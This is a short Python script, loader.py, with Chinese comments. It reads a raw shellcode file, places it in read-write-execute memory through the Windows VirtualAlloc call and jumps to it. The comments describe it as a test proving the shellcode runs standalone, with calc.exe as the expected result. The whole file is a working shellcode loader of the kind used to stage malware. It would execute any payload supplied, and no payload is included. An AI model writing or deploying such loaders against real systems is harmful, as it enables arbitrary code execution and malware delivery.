# -*- coding: utf-8 -*-
# loader.py -- 把 shellcode 加载到 RWX 内存并执行 (证明是独立可用的 shellcode)
# 用法: python loader.py [file.bin]   默认 shellcode.bin
import ctypes, os, sys
BASE = os.path.dirname(os.path.abspath(__file__))
f = sys.argv[1] if len(sys.argv) > 1 else "shellcode.bin"
path = f if os.path.isabs(f) else os.path.join(BASE, f)
sc = open(path, "rb").read()

k32 = ctypes.windll.kernel32
k32.VirtualAlloc.restype = ctypes.c_void_p
addr = k32.VirtualAlloc(0, len(sc), 0x3000, 0x40)  # MEM_COMMIT|RESERVE, PAGE_EXECUTE_READWRITE
if not addr:
    raise SystemExit("VirtualAlloc failed: %d" % k32.GetLastError())

print(f"[*] {os.path.basename(path)}: {len(sc)} bytes -> RWX @ 0x{addr:X}")
ctypes.memmove(addr, sc, len(sc))
ctypes.CFUNCTYPE(None)(addr)()
print("[+] executed (calc.exe should be open)")
